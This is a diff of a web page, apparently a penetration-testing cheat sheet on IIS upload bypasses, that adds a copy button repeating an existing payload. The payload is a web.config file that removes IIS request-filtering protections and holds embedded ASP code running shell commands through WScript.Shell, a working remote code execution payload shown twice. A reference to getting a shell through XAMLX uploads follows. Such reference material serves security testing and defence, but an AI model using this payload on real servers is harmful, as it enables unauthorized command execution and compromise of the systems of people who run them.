@@ -377,7 +377,7 @@
 <p>It's possible to bypass blacklist upload while uploading a <code>web.config</code> file.
 For this, you need to set execution rights to <code>.config</code> and then adding <code>ASP</code> code
 in the <code>web.config</code>.</p>
-<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+<div class="clipboard-content">  <pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
 &lt;configuration&gt;
    &lt;system.webServer&gt;
       &lt;handlers accessPolicy=&quot;Read, Script, Write&quot;&gt;
@@ -407,7 +407,37 @@ set cmd1 = nothing: Set wShell1 = nothing
 Response.write(output1)
 Response.write(&quot;&lt;/pre&gt;&lt;!-&quot;&amp;&quot;-&quot;) %&gt;
 -–&gt;
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;configuration&gt;
+   &lt;system.webServer&gt;
+      &lt;handlers accessPolicy=&quot;Read, Script, Write&quot;&gt;
+         &lt;add name=&quot;web_config&quot; path=&quot;*.config&quot; verb=&quot;*&quot; modules=&quot;IsapiModule&quot; scriptProcessor=&quot;%windir%\system32\inetsrv\asp.dll&quot; resourceType=&quot;Unspecified&quot; requireAccess=&quot;Write&quot; preCondition=&quot;bitness64&quot; /&gt;
+      &lt;/handlers&gt;
+      &lt;security&gt;
+         &lt;requestFiltering&gt;
+            &lt;fileExtensions&gt;
+               &lt;remove fileExtension=&quot;.config&quot; /&gt;
+            &lt;/fileExtensions&gt;
+            &lt;hiddenSegments&gt;
+               &lt;remove segment=&quot;web.config&quot; /&gt;
+            &lt;/hiddenSegments&gt;
+         &lt;/requestFiltering&gt;
+      &lt;/security&gt;
+   &lt;/system.webServer&gt;
+   &lt;appSettings&gt;
+&lt;/appSettings&gt;
+&lt;/configuration&gt;
+&lt;!–-
+&lt;% Response.write(&quot;-&quot;&amp;&quot;-&gt;&quot;)
+Response.write(&quot;&lt;pre&gt;&quot;)
+Set wShell1 = CreateObject(&quot;WScript.Shell&quot;)
+Set cmd1 = wShell1.Exec(&quot;whoami&quot;)
+output1 = cmd1.StdOut.Readall()
+set cmd1 = nothing: Set wShell1 = nothing
+Response.write(output1)
+Response.write(&quot;&lt;/pre&gt;&lt;!-&quot;&amp;&quot;-&quot;) %&gt;
+-–&gt;
+">    Copy  </button></div></div>
 <h2 id="upload-xamlx-file-to-get-rce">Upload XAMLX file to get RCE</h2>
 <p><a href="https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/august/getting-shell-with-xamlx-files/" target="_blank">NCCGroup</a>
 describes how to upload a <code>XAMLX</code> file to execute code on a remote IIS server.</p>
